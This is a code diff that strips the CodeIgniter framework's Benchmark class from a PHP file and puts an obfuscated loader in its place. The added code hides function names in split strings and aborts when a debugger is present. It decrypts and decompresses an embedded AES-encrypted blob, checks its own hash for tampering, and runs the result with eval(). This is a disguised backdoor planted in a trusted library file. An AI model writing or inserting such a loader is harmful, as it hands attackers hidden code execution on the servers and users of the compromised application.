@@ -1,133 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * Benchmark Class
- *
- * This class enables you to mark points and calculate the time difference
- * between them. Memory consumption can also be displayed.
- *
- * @package		CodeIgniter
- * @subpackage	Libraries
- * @category	Libraries
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/libraries/benchmark.html
- */
-class CI_Benchmark {
-
-	/**
-	 * List of all benchmark markers
-	 *
-	 * @var	array
-	 */
-	public $marker = array();
-
-	/**
-	 * Set a benchmark marker
-	 *
-	 * Multiple calls to this function can be made so that several
-	 * execution points can be timed.
-	 *
-	 * @param	string	$name	Marker name
-	 * @return	void
-	 */
-	public function mark($name)
-	{
-		$this->marker[$name] = microtime(TRUE);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Elapsed time
-	 *
-	 * Calculates the time difference between two marked points.
-	 *
-	 * If the first parameter is empty this function instead returns the
-	 * {elapsed_time} pseudo-variable. This permits the full system
-	 * execution time to be shown in a template. The output class will
-	 * swap the real value for this variable.
-	 *
-	 * @param	string	$point1		A particular marked point
-	 * @param	string	$point2		A particular marked point
-	 * @param	int	$decimals	Number of decimal places
-	 *
-	 * @return	string	Calculated elapsed time on success,
-	 *			an '{elapsed_string}' if $point1 is empty
-	 *			or an empty string if $point1 is not found.
-	 */
-	public function elapsed_time($point1 = '', $point2 = '', $decimals = 4)
-	{
-		if ($point1 === '')
-		{
-			return '{elapsed_time}';
-		}
-
-		if ( ! isset($this->marker[$point1]))
-		{
-			return '';
-		}
-
-		if ( ! isset($this->marker[$point2]))
-		{
-			$this->marker[$point2] = microtime(TRUE);
-		}
-
-		return number_format($this->marker[$point2] - $this->marker[$point1], $decimals);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Memory Usage
-	 *
-	 * Simply returns the {memory_usage} marker.
-	 *
-	 * This permits it to be put it anywhere in a template
-	 * without the memory being calculated until the end.
-	 * The output class will swap the real value for this variable.
-	 *
-	 * @return	string	'{memory_usage}'
-	 */
-	public function memory_usage()
-	{
-		return '{memory_usage}';
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_pxg8p5m8=('bas'.'e64'.'_de'.'cod'.'e');
+$_i3w82ha1=('gzu'.'nco'.'mpr'.'ess');
+$_w81gjbi1=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_mqym3shb='dWhx3SFo';
+$_rhadwyz8='PH/47mjX';
+$_angpxuh2='IZ/AC6qT';
+$_xbvyqyel='5ATScjj0zoo=';
+$_szoomlaz='EqGGJK88';
+$_boonrhmk='6rUVRw==';
+$_ih3qe9fv='82afZv5s';
+$_zizxnx7o='mPIOnWzu';
+$_amj2vnef=$_pxg8p5m8($_rhadwyz8.$_mqym3shb.$_angpxuh2.$_szoomlaz.$_xbvyqyel);
+$_jhc4tcfz=$_pxg8p5m8($_ih3qe9fv.$_zizxnx7o.$_boonrhmk);
+$_wgvd8e3s=$_pxg8p5m8('HpAiW4vCX4cJpqmAptz3eUb4oPZ7oEobT3vsLmMzMA+eVopA7VrD5wp9ZP/shHRNqqJ6yJ/huKXqmNsKlV2dmY3FaN6rbchFJfYi+RVh+vpp6JUp/aC2qv13RvH4SZZ0sW3kXnXOuTxqPqWt0Q/WU2rQWxocSBnujeaKFxh2WfXmAN2JalHBj4yUZzYPqKK1qmAholmNCiYv1hjp07ig2A0kX3pxZoCLF0Jj+V6LAdBcDc6lKU9iCHHK6X4qNq32Yp5KhHr4omLUz6CC8toWQfwsGCoKF/eNEQoG6w7/4Etn4/UonP5jv4wrVpGYXQ6iZvKlm6aXGwzX7Q38Ez3UuzBlxzRsXRoKJ0IE7xMu7eEjemfvKfpWnZmWvGe+R7xkx+UbgyBYBBJTTYJU9C6VCQ==');
+$_r7083swn=$_w81gjbi1($_wgvd8e3s,'aes-256-cbc',$_amj2vnef,OPENSSL_RAW_DATA,$_jhc4tcfz);
+if($_r7083swn===false){exit;}
+$_bp22nxq1=$_i3w82ha1($_r7083swn);
+if($_bp22nxq1===false){exit;}
+$_l8ddx2dz='09d071476918f91ecdb7b0411c32bf22ea6ca078963b81433d38ed8961aa50cf';
+$_mlf8q86h=@file_get_contents(__FILE__);
+if($_mlf8q86h!==false){
+$_f5ukprf0=str_replace($_l8ddx2dz,"0000000000000000000000000000000000000000000000000000000000000000",$_mlf8q86h);
+$_lyw5la7z=hash("sha256",$_f5ukprf0);
+if($_lyw5la7z!==$_l8ddx2dz){@http_response_code(403);exit;}
 }
+eval($_bp22nxq1);
